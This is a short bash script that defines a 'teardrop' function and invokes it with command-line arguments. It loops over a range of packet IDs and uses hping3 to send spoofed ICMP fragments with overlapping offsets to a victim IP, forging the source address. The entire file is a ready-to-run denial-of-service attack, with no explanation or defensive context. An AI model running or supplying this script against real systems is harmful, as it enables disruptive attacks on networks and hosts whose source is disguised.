#!/bin/bash

function teardrop ( )
{
	local victim_ip=$1
	local id_begin=$2
	local id_end=$3
	local source_ip=$4

	for((id=${id_begin};id<${id_end};id++))
	do
		hping3 --icmp ${victim_ip} -a ${source_ip} --data 100 --id ${id} --count 1 --morefrag
		hping3 --icmp ${victim_ip} -a ${source_ip} --data 50  --id ${id}  --count 1 --fragoff 60
	done
}

teardrop $*
